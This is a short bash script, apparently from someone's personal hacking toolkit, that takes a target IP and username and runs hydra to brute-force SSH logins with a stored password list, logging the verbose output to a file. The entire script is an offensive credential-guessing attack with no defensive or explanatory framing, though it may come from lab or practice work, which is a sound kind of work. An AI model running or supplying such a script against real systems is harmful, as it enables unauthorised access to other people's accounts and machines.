#!/bin/bash

ip=$(echo $1)
username=$(echo $2)

hydra -l $username -P /home/ryan/HackinStuff/HelpThings/unix_pass ssh://$ip -t 4 -V > /home/ryan/HackinStuff/IS/MET/hydra 2>&1